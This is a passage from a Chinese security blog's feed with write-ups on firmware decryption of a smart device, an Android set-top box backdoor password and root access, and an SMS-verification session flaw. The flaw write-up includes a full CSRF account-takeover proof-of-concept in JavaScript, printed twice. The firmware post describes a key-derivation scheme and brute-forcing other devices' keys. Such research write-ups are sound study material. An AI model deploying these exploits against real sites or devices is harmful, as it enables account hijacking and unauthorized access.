&lt;p&gt;拖到jeb里，发现加壳了。粗略看了下应该是梆梆的壳，渣渣如我根本不会脱壳。找大佬帮忙脱壳，却发现签名算法是放在native里的。。&lt;br&gt;硬着头皮把so拖到ida里，却发现整个so的结构非常奇怪，没有&lt;code&gt;JNI_OnLoad&lt;/code&gt;，导出表里的函数对应位置也不对。应该还是壳的问题，把so也加固了。&lt;br&gt;adb shell到手机上，发现有好几个此apk的进程，从其中一个进程里的maps里找到加载这个so的地址，想直接dd出来，却发现一但dd进程就会退掉。。&lt;br&gt;尝试挂上ida远程调试，却发现无论如何也attach不上这个进程，猜测可能是被它的父进程ptrace了 = = 杀掉父进程这个子进程也就退出了。。&lt;br&gt;然后尝试直接hook脱壳后java里的一些方法，也不能hook到。想直接调用so，由于连&lt;code&gt;JNI_OnLoad&lt;/code&gt;都没有，看起来也不像能直接调用的样子。&lt;br&gt;作为一个web狗碰到这些，在心里不知道念了多少次mdzz了。。&lt;br&gt;
    
    </summary>
    
      <category term="Android" scheme="http://5alt.me/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>某智能设备固件解密</title>
    <link href="http://5alt.me/2017/08/%E6%9F%90%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86/"/>
    <id>http://5alt.me/2017/08/某智能设备固件解密/</id>
    <published>2017-08-12T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2><p>拿到硬件设备的第一个想法就是获取固件。通常来说获取固件有三种方式：从设备官方网址下载，抓包固件升级过程，从设备固件存储器中获取。</p><p>此设备的官网提供在线升级的功能，升级过程需要读取硬件的一些基本信息，而此设备恰好不被支持。抄起工具把网站日了下来，却发现网站上只提供其他型号的升级包，而且是加过密的。于是只能从现有的设备入手了。</p><p>观察电路板，发现板子上主控芯片为ATMEL SAMA5D2系列的芯片，无明显的UART和JTAG接口，存在SOP8封装的型号为N25Q032A的Flash芯片。所以固件只能从Flash里读取出来了。</p><p>从Flash里读固件第一步是把芯片从板子上焊下来，对于SOP8封装的芯片建议用电风枪吹下来，血泪教训告诉我们，用电烙铁非常容易把芯片弄坏。</p><p>把Flash芯片焊下来之后就是从芯片里读取固件内容了。这里推荐用编程器来读，淘宝一两百人民币就能买到。我们也尝试过用<a href="https://www.flashrom.org/Flashrom" target="_blank" rel="noopener">FlashROM</a>来读，但是有时候会很不稳定，对于有的型号并不能完整的将Flash读出来。<br><a id="more"></a></p><h2 id="固件查看"><a href="#固件查看" class="headerlink" title="固件查看"></a>固件查看</h2><p>用 010editor 查看固件，观察固件发现在固件的0x20000偏移处有<code>F1 F2 F3 F4 CD CD CD CD CD CD CD CD 10 BB 00 00</code>开头的疑似加密之后的数据。猜测该部分为加密部分的头，0xBB10为加密部分的长度。同样的结构在0x70000也有。</p><p>即固件0x0开始为设备的启动代码，0x20000开始为一段加密数据，0x70000开始为另一段加密数据。</p><p>加密数据前16个byte为加密块的头。头结构为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xf4f3f2f1</span><br><span class="line">0xcdcdcdcd</span><br><span class="line">0xcdcdcdcd</span><br><span class="line">data_length</span><br></pre></td></tr></table></figure></p><p><img src="/images/201708/EncryptedData.png" alt="EncryptedData"></p><p>通过主控芯片的手册可知，芯片采用的是ARMv7-A的架构。ARM 是 RISC 指令集，在32位模式下一般为ARM指令集，指令长度固定，默认为小端模式。</p><p>将固件载入IDA，选择 ARM Little-endian 的处理器，可以看到程序的汇编代码。我们推测在启动代码里存在解密加密数据的算法和密钥。</p><p><img src="/images/201708/InterruptTable.png" alt="InterruptTable"></p><p>ARM代码最开始部分为中断向量表。常见的入口代码如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">    b       reset</span><br><span class="line">    ldr     pc, _undefined_instruction</span><br><span class="line">    ldr     pc, _software_interrupt</span><br><span class="line">    ldr     pc, _prefetch_abort</span><br><span class="line">    ldr     pc, _data_abort</span><br><span class="line">    ldr     pc, _not_used</span><br><span class="line">    ldr     pc, _irq</span><br><span class="line">    ldr     pc, _fiq</span><br><span class="line">...</span><br><span class="line">_irq:</span><br><span class="line">        .word irq</span><br></pre></td></tr></table></figure><p>这样当reset的时候，PC会被设置为<code>base+0</code>，遇到<code>undefined_instruction</code>的时候会将PC设置为<code>base+4</code>。reset指向的函数地址为初始化代码以及程序逻辑真正的入口。</p><p>从IDA里可以看到，该固件开始部分汇编代码符合入口的特征。</p><h2 id="寻找固件基址"><a href="#寻找固件基址" class="headerlink" title="寻找固件基址"></a>寻找固件基址</h2><p>对于这种没有底层操作系统的固件来说，第一步要找到基址，这是二进制文件加载到内存后在内存的地址。如果不调整基址，代码中有些绝对地址寻址的指令，寻找数据的时候可能对应不上。</p><p>一种方法是根据代码中的load指令寻找载入立即数的操作，来猜测基址。<br>在ARM中，大部分的load指令为相对寻址，载入相对于当前PC某个偏移处的内存内容，这个内容往往是一个绝对的在固件运行时的地址（即加上了基址之后的地址）。而在ida里，对于这种情况进行了显示上的处理，会直接显示将这个绝对的地址加载到寄存器里。可以根据load指令加载的地址猜测出一个基址来，如果一些内存能成功的找到xref，即说明基址找的是正确的。一个自动化寻找基址的方案是，用strings找出字符串在文件中的偏移，在ida里找出所有load指令加载的地址，爆破基址，当字符串的偏移加上基址能在load指令加载的地址里找的时，这个基址有很大可能为正确的基址。</p><p>另外，对于一个嵌入式设备来讲，一般会将ROM加载到内存中然后执行。查看芯片的手册，手册中的内存设备地址一般为基址。如果外部flash存放的代码是一个bootloader，那么逆向可以获得下一步程序加载的基址。（一般用于固件解密后跳转到真正的代码执行）</p><p>对于其他情况，如果固件能通过binwalk识别出u-boot image，在信息里会输出基址，因为在u-boot image的文件头中存有基址信息。</p><p>在这里，我们找到固件的基址为<code>0x200000</code>。</p><h2 id="固件逆向"><a href="#固件逆向" class="headerlink" title="固件逆向"></a>固件逆向</h2><p>由于固件有部分数据是加密过的，在运行的时候一定会存在解密操作。用IDA的Find Crypt插件寻找常用密码学算法的常量，发现代码中存在sha256和sha512算法。同时在芯片的手册中发现有硬件AES模块，在此CPU中，AES硬件模块的基址为<code>0xF002C000</code>。在IDA中寻找该立即数即可找到固件中调用硬件AES的代码，根据手册中对应位置内存的功能对代码中函的进行标记。对于这些特殊的地址，在逆向过程中边查手册边将其功能标记出来。</p><p><img src="/images/201708/AESCtrolRegister.png" alt="AESCtrolRegister"></p><p><img src="/images/201708/AESFunctions.png" alt="AESFunctions"></p><p>我们发现，与AES相关的函数地址以及sha256的地址被存放在了内存中的某个区域，在一段疑似对数据块解密的函数中进行了调用。<br>此函数先判断了数据块是否以<code>0xf4f3f2f1</code>开头，并检查其长度是否小于0x30000并且是否为0x40的倍数。然后就是获取芯片的序列号并做sha256作为key1，然后把序列号进行byte交换，sha256后作为key2，设置IV为<code>\x00\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x20\x00\x00\x00</code>，对前一半的数据用key1解，后一半的数据用key2解。解完之后得到真正的逻辑代码。</p><p>按照这个逻辑看来，固件的解密需要获取芯片的序列号，每个芯片的系列号都不相同，所以每个板子中的固件也都不一样。问题来了，我们怎么才能拿到芯片的序列号呢？</p><h2 id="解密固件"><a href="#解密固件" class="headerlink" title="解密固件"></a>解密固件</h2><p>为了解密固件，我们需要拿到芯片的序列号作为AES的key。网上搜了一会也没搜到有用的信息。由于板子上也没有可以连接电脑输出的接口，即使读到了也很难将其输出出来。难道要从板子上找个灯，将读到的序列号通过控制灯的亮灭一位一位的输出出来吗。。</p><p>该设备可以将配置的修改保存下来，那么就一定有写回 flash 的方法。我们可以把序列号读出来之后再写回 flash，这样再读一次flash就能得到序列号了。FLash芯片在写之前需要先erase。因为Flash的write只能使bit从1变成0，而Flash erase会把所有的bit设置为1。</p><p>修改固件代码，把读取序列号并写回flash的shellcode填入，焊回flash芯片上电运行一段时间，取下flash，读取出里面的序列号即可解密固件。<br>由于芯片的序列号是有规律的，我们可以通过暴力序列号的一部分来解密其他设备的固件。</p><p>在固件里也发现了一个固定的AES密钥，猜测是用来解密升级固件的，尝试用来解密官网上的其他型号的固件升级包失败。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>对于智能设备的固件，厂商很难保证固件不被攻击者拿到。对固件的加密只能增加攻击者获取固件的难度。对于小型的设备最好的方法是把固件保存在主控芯片内的rom中，或者将核心的解密逻辑放在主控芯片内，这样攻击者很难获取到主控芯片内的flash中存储的数据，使固件不能被以较低成本获取。</p><p>在逆向的过程中，由于固件的代码没有外部函数的调用，可以用模拟器来模拟执行一些代码段辅助逆向。<a href="https://github.com/5alt/emu" target="_blank" rel="noopener">emu</a>是基于unicorn的一个模拟执行辅助脚本，根据<a href="https://github.com/36hours/idaemu" target="_blank" rel="noopener">idaemu</a>修改而来，欢迎一起共同维护。</p><p>感谢hyperchem大佬带我飞！</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://reverseengineering.stackexchange.com/questions/13948/how-to-find-bootloader-load-address" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/13948/how-to-find-bootloader-load-address</a><br><a href="http://stackoverflow.com/questions/21312963/arm-bootloader-interrupt-vector-table-understanding" target="_blank" rel="noopener">http://stackoverflow.com/questions/21312963/arm-bootloader-interrupt-vector-table-understanding</a><br><a href="https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/" target="_blank" rel="noopener">https://sviehb.wordpress.com/2011/09/09/reverse-engineering-an-obfuscated-firmware-image-e02-analysis/</a><br><a href="https://github.com/5alt/emu" target="_blank" rel="noopener">https://github.com/5alt/emu</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;获取固件&quot;&gt;&lt;a href=&quot;#获取固件&quot; class=&quot;headerlink&quot; title=&quot;获取固件&quot;&gt;&lt;/a&gt;获取固件&lt;/h2&gt;&lt;p&gt;拿到硬件设备的第一个想法就是获取固件。通常来说获取固件有三种方式：从设备官方网址下载，抓包固件升级过程，从设备固件存储器中获取。&lt;/p&gt;
&lt;p&gt;此设备的官网提供在线升级的功能，升级过程需要读取硬件的一些基本信息，而此设备恰好不被支持。抄起工具把网站日了下来，却发现网站上只提供其他型号的升级包，而且是加过密的。于是只能从现有的设备入手了。&lt;/p&gt;
&lt;p&gt;观察电路板，发现板子上主控芯片为ATMEL SAMA5D2系列的芯片，无明显的UART和JTAG接口，存在SOP8封装的型号为N25Q032A的Flash芯片。所以固件只能从Flash里读取出来了。&lt;/p&gt;
&lt;p&gt;从Flash里读固件第一步是把芯片从板子上焊下来，对于SOP8封装的芯片建议用电风枪吹下来，血泪教训告诉我们，用电烙铁非常容易把芯片弄坏。&lt;/p&gt;
&lt;p&gt;把Flash芯片焊下来之后就是从芯片里读取固件内容了。这里推荐用编程器来读，淘宝一两百人民币就能买到。我们也尝试过用&lt;a href=&quot;https://www.flashrom.org/Flashrom&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;FlashROM&lt;/a&gt;来读，但是有时候会很不稳定，对于有的型号并不能完整的将Flash读出来。&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://5alt.me/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>SESSION 中的手机验证码</title>
    <link href="http://5alt.me/2017/07/SESSION%E4%B8%AD%E7%9A%84%E6%89%8B%E6%9C%BA%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://5alt.me/2017/07/SESSION中的手机验证码/</id>
    <published>2017-07-13T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.784Z</updated>
    
    <content type="html"><![CDATA[<p>之前在检测某网站的时候发现了一个好玩的逻辑问题，可以在更换手机号的时候，可以不用原手机的验证码解绑,只需要新手机接收验证码就能绑定手机。</p><p>漏洞的成因是新旧手机的验证码在 session 中用同一个变量名存储，更换手机号的时候运行越过前面几步直接向新手机发送短信验证码。此时新手机的短信验证码就被当成了第一步解绑老手机时发往老手机的验证码，导致攻击者可以直接用自己的手机绑定到受害者的账号上。<br><a id="more"></a><br>首先发送给新手机号发送验证码的请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /user/send_new_mobile_sms HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mobile=新手机号</span><br></pre></td></tr></table></figure><p>在新手机号接收到验证码之后发送请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /user/verify_mobile_sms HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">smscode1=新手机号验证码</span><br></pre></td></tr></table></figure><p>最后绑定新手机号:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /user/verify_new_mobile_sms HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">smscode2=新手机号验证码</span><br></pre></td></tr></table></figure><p>此逻辑漏洞配合 CSRF 漏洞可以实现以下攻击场景:在用户登录网站的情况下，只要访问攻击者的一个页面，攻击者就能把自己的手机号绑定到用户的账号上，进而控制用户的账号。</p><p>最后附上POC：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'poc'</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">httpRequest = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">httpRequest.open(<span class="string">'GET'</span>, url, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined">httpRequest.send();</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (httpRequest.status === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> httpRequest.responseText;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">url, key, value</span>)</span>&#123;</span></span><br><span class="line"><span class="xml">data='<span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"f1"</span> <span class="attr">action</span>=<span class="string">"'+url+'"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"'+key+'"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"'+value+'"</span> /&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> \</span></span></span><br><span class="line"><span class="javascript">f1.submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;) \</span></span><br><span class="line"><span class="javascript">&lt;\/script&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="string">'</span></span></span><br><span class="line"><span class="javascript">f=<span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>)</span></span><br><span class="line"><span class="javascript">f.src=<span class="string">"data:text/html;base64,"</span>+btoa(data)</span></span><br><span class="line"><span class="undefined">f.height=0</span></span><br><span class="line"><span class="undefined">f.width=0</span></span><br><span class="line"><span class="undefined">poc.append(f)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">getcode</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">url = <span class="string">'http://127.0.0.1/1.php'</span></span></span><br><span class="line"><span class="undefined">data = get(url)</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(data.length &gt; <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="undefined">clearInterval(sh)</span></span><br><span class="line"><span class="undefined">exploit(data)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">code</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">url = <span class="string">"https://www.xxx.com/user/verify_mobile_sms"</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//post(url, "smscode1", code)</span></span></span><br><span class="line"><span class="javascript">setTimeout(post, <span class="number">0</span>, url, <span class="string">"smscode1"</span>, code)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">url = <span class="string">"https://www.xxx.com/user/verify_new_mobile_sms"</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//post(url, "smscode2", code)</span></span></span><br><span class="line"><span class="javascript">setTimeout(post, <span class="number">3000</span>, url, <span class="string">"smscode2"</span>, code)</span></span><br><span class="line"><span class="javascript">setTimeout(alert, <span class="number">4000</span>, <span class="string">'mobile changed!'</span>)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">post(<span class="string">"https://www.xxx.com/user/send_new_mobile_sms"</span>, <span class="string">'mobile'</span>, <span class="string">'18888888888'</span>)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">code = <span class="string">''</span></span></span><br><span class="line"><span class="undefined">sh=setInterval(getcode,1000);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'poc'</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">httpRequest = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">httpRequest.open(<span class="string">'GET'</span>, url, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined">httpRequest.send();</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (httpRequest.status === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> httpRequest.responseText;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">url, key, value</span>)</span>&#123;</span></span><br><span class="line"><span class="xml">data='<span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"f1"</span> <span class="attr">action</span>=<span class="string">"'+url+'"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"'+key+'"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"'+value+'"</span> /&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> \</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> \</span></span></span><br><span class="line"><span class="javascript">f1.submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;) \</span></span><br><span class="line"><span class="javascript">&lt;\/script&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="string">'</span></span></span><br><span class="line"><span class="javascript">f=<span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>)</span></span><br><span class="line"><span class="javascript">f.src=<span class="string">"data:text/html;base64,"</span>+btoa(data)</span></span><br><span class="line"><span class="undefined">f.height=0</span></span><br><span class="line"><span class="undefined">f.width=0</span></span><br><span class="line"><span class="undefined">poc.append(f)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">getcode</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">url = <span class="string">'http://127.0.0.1/1.php'</span></span></span><br><span class="line"><span class="undefined">data = get(url)</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(data.length &gt; <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="undefined">clearInterval(sh)</span></span><br><span class="line"><span class="undefined">exploit(data)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">code</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">url = <span class="string">"https://www.jxxx.com/user/verify_mobile_sms"</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//post(url, "smscode1", code)</span></span></span><br><span class="line"><span class="javascript">setTimeout(post, <span class="number">0</span>, url, <span class="string">"smscode1"</span>, code)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">url = <span class="string">"https://www.xxx.com/user/verify_new_mobile_sms"</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//post(url, "smscode2", code)</span></span></span><br><span class="line"><span class="javascript">setTimeout(post, <span class="number">3000</span>, url, <span class="string">"smscode2"</span>, code)</span></span><br><span class="line"><span class="javascript">setTimeout(alert, <span class="number">4000</span>, <span class="string">'mobile changed!'</span>)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">post(<span class="string">"https://www.xxx.com/user/send_new_mobile_sms"</span>, <span class="string">'mobile'</span>, <span class="string">'18888888888'</span>)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">code = <span class="string">''</span></span></span><br><span class="line"><span class="undefined">sh=setInterval(getcode,1000);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前在检测某网站的时候发现了一个好玩的逻辑问题，可以在更换手机号的时候，可以不用原手机的验证码解绑,只需要新手机接收验证码就能绑定手机。&lt;/p&gt;
&lt;p&gt;漏洞的成因是新旧手机的验证码在 session 中用同一个变量名存储，更换手机号的时候运行越过前面几步直接向新手机发送短信验证码。此时新手机的短信验证码就被当成了第一步解绑老手机时发往老手机的验证码，导致攻击者可以直接用自己的手机绑定到受害者的账号上。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>关于联通机顶盒</title>
    <link href="http://5alt.me/2017/06/%E5%85%B3%E4%BA%8E%E8%81%94%E9%80%9A%E6%9C%BA%E9%A1%B6%E7%9B%92/"/>
    <id>http://5alt.me/2017/06/关于联通机顶盒/</id>
    <published>2017-06-13T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.786Z</updated>
    
    <content type="html"><![CDATA[<p>装联通宽带送了个机顶盒，没啥用，只能看一些收费的节目。看起来是个安卓的盒子，那就搞一搞吧。</p><h2 id="ZTE机顶盒"><a href="#ZTE机顶盒" class="headerlink" title="ZTE机顶盒"></a>ZTE机顶盒</h2><p>第一次送的机顶盒是中兴的，有个现成的工具可以开启adb，直接搞定。</p><p><a href="/downloads/liantong_zhongxing_pojie.rar">工具下载</a></p><p>顺便提取出来的还有一些奇怪的网站，可以下到所有版本的固件，附后。<br><a id="more"></a></p><h2 id="数码视讯Q5"><a href="#数码视讯Q5" class="headerlink" title="数码视讯Q5"></a>数码视讯Q5</h2><p>这个盒子有三种方法破解。</p><h3 id="拆机ttl"><a href="#拆机ttl" class="headerlink" title="拆机ttl"></a>拆机ttl</h3><p>拆机，在主板上很容易就能看到有串口，波特率是115200，数据位8，奇偶校验无，停止位1，流控制无，连接上就能获得一个root shell。</p><p><img src="/images/201706/liantong_box_ttl.jpg" alt="root shell"></p><h3 id="路由器iptables"><a href="#路由器iptables" class="headerlink" title="路由器iptables"></a>路由器iptables</h3><p>机顶盒安装页面中推广的apk的时候走的是http协议，可以简单劫持，替换apk。</p><h3 id="后门密码"><a href="#后门密码" class="headerlink" title="后门密码"></a>后门密码</h3><p>在设置中有个高级设置，后门密码是<code>82345862</code>，可以发现开启adb的隐藏选项。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>如果将盒子重置了，在进入系统的时候会卡在 90% 身份验证的地方，这时候装个沙发桌面就能直接绕过这个登陆了。（真像是在打广告）</p><h2 id="一些链接"><a href="#一些链接" class="headerlink" title="一些链接"></a>一些链接</h2><p>启动页广告信息： <a href="http://210.13.0.175:7083/launcher/xml/1495680551/launcher_1080p.xml" target="_blank" rel="noopener">http://210.13.0.175:7083/launcher/xml/1495680551/launcher_1080p.xml</a><br><!--固件下载： http://210.13.0.180/softVersion--></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.znds.com/tv-695278-1-1.html" target="_blank" rel="noopener">http://www.znds.com/tv-695278-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;装联通宽带送了个机顶盒，没啥用，只能看一些收费的节目。看起来是个安卓的盒子，那就搞一搞吧。&lt;/p&gt;
